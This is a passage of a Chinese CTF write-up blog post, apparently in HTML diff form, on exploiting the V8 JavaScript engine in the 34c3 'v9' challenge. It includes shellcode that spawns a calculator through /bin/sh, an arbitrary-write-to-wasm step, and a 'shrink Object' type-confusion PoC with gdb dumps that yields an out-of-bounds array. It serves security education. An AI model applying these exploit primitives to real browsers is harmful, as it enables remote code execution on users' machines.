class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line"></span><br><span class="line">arbWrite(wasm_code_addr,sc);</span><br><span class="line">f();</span><br><span class="line"><span class="comment">// %DebugPrint(fake_ab_obj);</span></span><br><span class="line"><span class="comment">// %DebugPrint(data_view);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_ab_obj);</span></span><br></pre></td></tr></table></figure>
+<h2 id="shrink-Object"><a href="#shrink-Object" class="headerlink" title="shrink Object"></a>shrink Object</h2><p>这种方法是从<a href="https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html" target="_blank" rel="noopener">2019师傅</a>和<a href="https://e3pem.github.io/2020/05/20/browser/xnuca2019-jit/" target="_blank" rel="noopener">姚老板</a>那里学到的</p>
+<h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>我们以下面的代码为例调试观察</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">a</span>:<span class="number">1.1</span>,<span class="attr">b</span>:<span class="number">1.2</span>,<span class="attr">c</span>:<span class="number">1.3</span>,<span class="attr">d</span>:<span class="number">1.4</span>,<span class="attr">e</span>:<span class="number">1.5</span>&#125;;</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">delete</span> obj[<span class="string">'d'</span>];</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">%SystemBreak();</span><br><span class="line">gc();</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+<p><code>obj</code>是一个字典对象，正常是<code>FastProperties</code>，在其<code>obj_addr+0x18</code>处存放字典的<code>in-object</code>属性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3f088da8cda9: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x12195140c751 [FastProperties]</span><br><span class="line"> - prototype = 0x72a068046a9</span><br><span class="line"> - elements = 0x3a94c8c82251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x3a94c8c82251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#a: &lt;unboxed double&gt; 1.1 (data field 0)</span></span><br><span class="line">    <span class="comment">#b: &lt;unboxed double&gt; 1.2 (data field 1)</span></span><br><span class="line">    <span class="comment">#c: &lt;unboxed double&gt; 1.3 (data field 2)</span></span><br><span class="line">    <span class="comment">#d: &lt;unboxed double&gt; 1.4 (data field 3)</span></span><br><span class="line">    <span class="comment">#e: &lt;unboxed double&gt; 1.5 (data field 4)</span></span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ telescope 0x3f088da8cda9-1</span><br><span class="line">0000| 0x3f088da8cda8 --&gt; 0x12195140c751 --&gt; 0x8000002b2938822 </span><br><span class="line">0008| 0x3f088da8cdb0 --&gt; 0x3a94c8c82251 --&gt; 0x2b2938822 </span><br><span class="line">0016| 0x3f088da8cdb8 --&gt; 0x3a94c8c82251 --&gt; 0x2b2938822 </span><br><span class="line">0024| 0x3f088da8cdc0 --&gt; 0x3ff199999999999a </span><br><span class="line">0032| 0x3f088da8cdc8 --&gt; 0x3ff3333333333333 </span><br><span class="line">0040| 0x3f088da8cdd0 --&gt; 0x3ff4cccccccccccd </span><br><span class="line">0048| 0x3f088da8cdd8 --&gt; 0x3ff6666666666666 </span><br><span class="line">0056| 0x3f088da8cde0 --&gt; 0x3ff8000000000000 </span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3f088da8cdc0</span><br><span class="line"><span class="variable">$3</span> = 1.1000000000000001</span><br></pre></td></tr></table></figure>
+<p>然而除了fast-mode外还有一种模式为<code>dictionary-mode</code>，我们执行<code>delete obj[&#39;d&#39;];</code>，对象变为了字典模式。当我们使用job观察原来的<code>obj_addr+0x18</code>时显示的是<code>free space, size 40</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3f088da8cda9: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x121951408c41 [DictionaryProperties]</span><br><span class="line"> - prototype = 0x72a068046a9</span><br><span class="line"> - elements = 0x3a94c8c82251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x3f088da8cff1 &lt;HashTable[53]&gt; &#123;</span><br><span class="line">   <span class="comment">#b: 0x3f088da8d1b9 &lt;Number 1.2&gt; (data, dict_index: 2, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#c: 0x3f088da8d1c9 &lt;Number 1.3&gt; (data, dict_index: 3, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#e: 0x3f088da8d1e9 &lt;Number 1.5&gt; (data, dict_index: 5, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#a: 0x3f088da8d1a9 &lt;Number 1.1&gt; (data, dict_index: 1, attrs: [WEC])</span></span><br><span class="line">gdb-peda$ telescope 0x3f088da8cda9-1</span><br><span class="line">0000| 0x3f088da8cda8 --&gt; 0x121951408c41 --&gt; 0x3000002b2938822 </span><br><span class="line">0008| 0x3f088da8cdb0 --&gt; 0x3f088da8cff1 --&gt; 0x2b2938826 </span><br><span class="line">0016| 0x3f088da8cdb8 --&gt; 0x3a94c8c82251 --&gt; 0x2b2938822 </span><br><span class="line">0024| 0x3f088da8cdc0 --&gt; 0x2b293882201 --&gt; 0x2b2938822 </span><br><span class="line">0032| 0x3f088da8cdc8 --&gt; 0x2800000000 (<span class="string">''</span>)</span><br><span class="line">0040| 0x3f088da8cdd0 --&gt; 0x3ff4cccccccccccd </span><br><span class="line">0048| 0x3f088da8cdd8 --&gt; 0x3ff6666666666666 </span><br><span class="line">0056| 0x3f088da8cde0 --&gt; 0x3ff8000000000000 </span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3f088da8cdd0</span><br><span class="line"><span class="variable">$4</span> = 1.3</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3f088da8cdd8</span><br><span class="line"><span class="variable">$5</span> = 1.3999999999999999</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3f088da8cde0</span><br><span class="line"><span class="variable">$6</span> = 1.5</span><br><span class="line">gdb-peda$ job 0x3f088da8cdc1</span><br><span class="line">free space, size 40</span><br></pre></td></tr></table></figure>
+<p>调用gc函数，obj对象会被放到<code>Old-Space</code>中，原来的<code>obj_addr+0x18</code>处存放了其他移动到这里的对象</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x28f16db05b61: [JS_OBJECT_TYPE] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map = 0x121951408c41 [DictionaryProperties]</span><br><span class="line"> - prototype = 0x72a068046a9</span><br><span class="line"> - elements = 0x3a94c8c82251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x28f16db0b861 &lt;HashTable[53]&gt; &#123;</span><br><span class="line">   <span class="comment">#b: 0x28f16db0ba59 &lt;Number 1.2&gt; (data, dict_index: 2, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#c: 0x28f16db0ba69 &lt;Number 1.3&gt; (data, dict_index: 3, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#e: 0x28f16db0ba79 &lt;Number 1.5&gt; (data, dict_index: 5, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#a: 0x28f16db0ba89 &lt;Number 1.1&gt; (data, dict_index: 1, attrs: [WEC])</span></span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ telescope 0x28f16db05b61-1</span><br><span class="line">0000| 0x28f16db05b60 --&gt; 0x121951408c41 --&gt; 0x3000002b2938822 </span><br><span class="line">0008| 0x28f16db05b68 --&gt; 0x28f16db0b861 --&gt; 0x2b2938826 </span><br><span class="line">0016| 0x28f16db05b70 --&gt; 0x3a94c8c82251 --&gt; 0x2b2938822 </span><br><span class="line">0024| 0x28f16db05b78 --&gt; 0x2b2938822f1 --&gt; 0x2b2938822 </span><br><span class="line">0032| 0x28f16db05b80 --&gt; 0x500000000 </span><br><span class="line">0040| 0x28f16db05b88 --&gt; 0x100000000 </span><br><span class="line">0048| 0x28f16db05b90 --&gt; 0x3a94c8c849d1 --&gt; 0x51000002b293883d </span><br><span class="line">0056| 0x28f16db05b98 --&gt; 0x3a94c8c82f49 --&gt; 0xaa000002b2938824 </span><br><span class="line">gdb-peda$ job 0x28f16db05b78+1</span><br><span class="line">0x28f16db05b79: [FixedArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map = 0x2b2938822f1 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 5</span><br><span class="line">           0: 1</span><br><span class="line">           1: 0x3a94c8c849d1 &lt;Tuple2 0x3a94c8c82251 &lt;FixedArray[0]&gt;, 0x3a94c8c82251 &lt;FixedArray[0]&gt;&gt;</span><br><span class="line">           2: 0x3a94c8c82f49 &lt;String[11]: constructor&gt;</span><br><span class="line">           3: 534</span><br><span class="line">           4: 0x72a06824489 &lt;JSFunction (sfi = 0x72a068243e9)&gt;</span><br></pre></td></tr></table></figure>
+<p>假如我们可以控制gc后<code>obj_addr+0x18</code>处存放的对象为<code>Array</code>，则可以通过类型混淆后的<code>in-object</code>赋值修改<code>arr</code>的属性，如修改length。</p>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>我们在<code>obj</code>对象后面布置了<code>arr</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> x = obj.x;</span><br><span class="line">    callback();</span><br><span class="line">    obj.d = <span class="number">0x2000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">    foo(&#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>,<span class="attr">l</span>:<span class="number">4</span>,<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>,<span class="attr">d</span>:<span class="number">8</span>,<span class="attr">e</span>:<span class="number">9</span>&#125;,()=&gt;<span class="number">1</span>);</span><br><span class="line">    foo(&#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>,<span class="attr">l</span>:<span class="number">4</span>,<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>,<span class="attr">d</span>:<span class="number">8</span>,<span class="attr">e</span>:<span class="number">9</span>&#125;,()=&gt;<span class="number">2</span>);</span><br><span class="line">    foo(&#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>,<span class="attr">l</span>:<span class="number">4</span>,<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>,<span class="attr">d</span>:<span class="number">8</span>,<span class="attr">e</span>:<span class="number">9</span>&#125;,()=&gt;<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">obj = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>,<span class="attr">l</span>:<span class="number">4</span>,<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>,<span class="attr">d</span>:<span class="number">8</span>,<span class="attr">e</span>:<span class="number">9</span>&#125;;</span><br><span class="line">arr = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj.__defineGetter__(<span class="string">'xx'</span>,()=&gt;<span class="number">2</span>);</span><br><span class="line">    obj.__defineGetter__(<span class="string">'xx'</span>,()=&gt;<span class="number">2</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    %DebugPrint(obj);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">    gc();</span><br><span class="line">    %DebugPrint(obj);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">&#125;</span><br><span class="line">foo(obj,evil);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]length of arr : "</span> + hex(arr.length))</span><br></pre></td></tr></table></figure>
+<p>在未进行<code>obj.__defineGetter__(&#39;xx&#39;,()=&gt;2)</code>前，<code>obj_addr+0x18</code>存储着<code>in-object</code>属性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2b965c4af989: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2f7537a0c891 [FastProperties]</span><br><span class="line"> - prototype = 0x1c3a06b846a9</span><br><span class="line"> - elements = 0xaea0a882251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0xaea0a882251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#x: 1 (data field 0)</span></span><br><span class="line">    <span class="comment">#y: 2 (data field 1)</span></span><br><span class="line">    <span class="comment">#z: 3 (data field 2)</span></span><br><span class="line">    <span class="comment">#l: 4 (data field 3)</span></span><br><span class="line">    <span class="comment">#a: 5 (data field 4)</span></span><br><span class="line">    <span class="comment">#b: 6 (data field 5)</span></span><br><span class="line">    <span class="comment">#c: 7 (data field 6)</span></span><br><span class="line">    <span class="comment">#d: 8 (data field 7)</span></span><br><span class="line">    <span class="comment">#e: 9 (data field 8)</span></span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ telescope 0x2b965c4af989-1</span><br><span class="line">0000| 0x2b965c4af988 --&gt; 0x2f7537a0c891 --&gt; 0xc00002e8e55a022 </span><br><span class="line">0008| 0x2b965c4af990 --&gt; 0xaea0a882251 --&gt; 0x2e8e55a022 </span><br><span class="line">0016| 0x2b965c4af998 --&gt; 0xaea0a882251 --&gt; 0x2e8e55a022 </span><br><span class="line">0024| 0x2b965c4af9a0 --&gt; 0x100000000 </span><br><span class="line">0032| 0x2b965c4af9a8 --&gt; 0x200000000 </span><br><span class="line">0040| 0x2b965c4af9b0 --&gt; 0x300000000 </span><br><span class="line">0048| 0x2b965c4af9b8 --&gt; 0x400000000 </span><br><span class="line">0056| 0x2b965c4af9c0 --&gt; 0x500000000</span><br></pre></td></tr></table></figure>
+<p>在未gc前</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2b965c4af989: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2f7537a08c41 [DictionaryProperties]</span><br><span class="line"> - prototype = 0x1c3a06b846a9</span><br><span class="line"> - elements = 0xaea0a882251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x2b965c4afb79 &lt;HashTable[101]&gt; &#123;</span><br><span class="line">   <span class="comment">#d: 8 (data, dict_index: 8, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#z: 3 (data, dict_index: 3, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#c: 7 (data, dict_index: 7, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#l: 4 (data, dict_index: 4, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#a: 5 (data, dict_index: 5, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#x: 1 (data, dict_index: 1, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#xx: 0x1c3a06bac7c1 &lt;AccessorPair&gt; (accessor, dict_index: 10, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#b: 6 (data, dict_index: 6, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#e: 9 (data, dict_index: 9, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#y: 2 (data, dict_index: 2, attrs: [WEC])</span></span><br><span class="line">gdb-peda$ telescope 0x2b965c4af989-1</span><br><span class="line">0000| 0x2b965c4af988 --&gt; 0x2f7537a08c41 --&gt; 0x300002e8e55a022 </span><br><span class="line">0008| 0x2b965c4af990 --&gt; 0x2b965c4afb79 --&gt; 0x2e8e55a026 </span><br><span class="line">0016| 0x2b965c4af998 --&gt; 0xaea0a882251 --&gt; 0x2e8e55a022 </span><br><span class="line">0024| 0x2b965c4af9a0 --&gt; 0x2e8e55a02201 --&gt; 0x2e8e55a022 </span><br><span class="line">0032| 0x2b965c4af9a8 --&gt; 0x4800000000 (<span class="string">''</span>)</span><br><span class="line">0040| 0x2b965c4af9b0 --&gt; 0x300000000 </span><br><span class="line">0048| 0x2b965c4af9b8 --&gt; 0x400000000 </span><br><span class="line">0056| 0x2b965c4af9c0 --&gt; 0x500000000 </span><br><span class="line">gdb-peda$ job 0x2b965c4af9a1</span><br><span class="line">free space, size 72</span><br></pre></td></tr></table></figure>
+<p>在gc后，发现成功让<code>arr</code>布置在了<code>obj_addr+0x18</code>处<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x1fb96c18bcc1-1</span><br><span class="line">0000| 0x1fb96c18bcc0 --&gt; 0x2f7537a08c41 --&gt; 0x300002e8e55a022 </span><br><span class="line">0008| 0x1fb96c18bcc8 --&gt; 0x1fb96c18be19 --&gt; 0x2e8e55a026 </span><br><span class="line">0016| 0x1fb96c18bcd0 --&gt; 0xaea0a882251 --&gt; 0x2e8e55a022 </span><br><span class="line">0024| 0x1fb96c18bcd8 --&gt; 0x2e8e55a02de1 --&gt; 0x2e8e55a022 </span><br><span class="line">0032| 0x1fb96c18bce0 --&gt; 0x200000000</span><br><span class="line">0040| 0x1fb96c18bce8 --&gt; 0x3ff199999999999a </span><br><span class="line">0048| 0x1fb96c18bcf0 --&gt; 0x400199999999999a </span><br><span class="line">0056| 0x1fb96c18bcf8 --&gt; 0x2f7537a02841 --&gt; 0x400002e8e55a022 </span><br><span class="line">gdb-peda$ job 0x1fb96c18bcd9</span><br><span class="line">0x1fb96c18bcd9: [FixedDoubleArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map = 0x2e8e55a02de1 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - length: 2</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br></pre></td></tr></table></figure></p>
+<p>再加一条调试，发现<code>d</code>对应<code>arr.length</code>，修改后即可得到一个oob数组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x2572fdb0bcf9-1 20</span><br><span class="line">0000| 0x2572fdb0bcf8 --&gt; 0x32fca2808c41 --&gt; 0x300000346a7e822 </span><br><span class="line">0008| 0x2572fdb0bd00 --&gt; 0x2572fdb0be51 --&gt; 0x346a7e826 </span><br><span class="line">0016| 0x2572fdb0bd08 --&gt; 0x55bbfa82251 --&gt; 0x346a7e822 </span><br><span class="line">0024| 0x2572fdb0bd10 --&gt; 0x346a7e82de1 --&gt; 0x346a7e822 (x)</span><br><span class="line">0032| 0x2572fdb0bd18 --&gt; 0x200000000 (y)</span><br><span class="line">0040| 0x2572fdb0bd20 --&gt; 0x3ff199999999999a (z)</span><br><span class="line">0048| 0x2572fdb0bd28 --&gt; 0x400199999999999a (l)</span><br><span class="line">0056| 0x2572fdb0bd30 --&gt; 0x32fca2802841 --&gt; 0x400000346a7e822 (a)</span><br><span class="line">0064| 0x2572fdb0bd38 --&gt; 0x55bbfa82251 --&gt; 0x346a7e822 (b)</span><br><span class="line">0072| 0x2572fdb0bd40 --&gt; 0x2572fdb0be31 --&gt; 0x346a7e82d (c)</span><br><span class="line">0080| 0x2572fdb0bd48 --&gt; 0x200000000000 (<span class="string">''</span>) (d)</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了OOB数组后面的利用就很常规了，这里就不再赘述了.</p>
+<h2 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h2><p><img src="/2021/05/26/34c3-v9/1.png" alt></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>花了几天时间总结了<code>34c3 CTF v9</code>的几种利用方式，其中第一和第三种方式在<code>debug</code>版本里也可以过，第二种只能在<code>release</code>中用，个人觉得第三种方法是最简单的，第二种是最直观的，第一种方式比较绕，不过很有意思，对于<code>checkMaps</code>消除类型的题目上述几种方法可以作为比较通用的思路。注意这里第二种方式里我们其实已经构造出了<code>fakeObj</code>原语，所以通过之前的利用方式也可以继续往后走。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/05/13/v8-basic/" rel="next" title="浏览器基础">
+                <i class="fa fa-chevron-left"></i> 浏览器基础
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
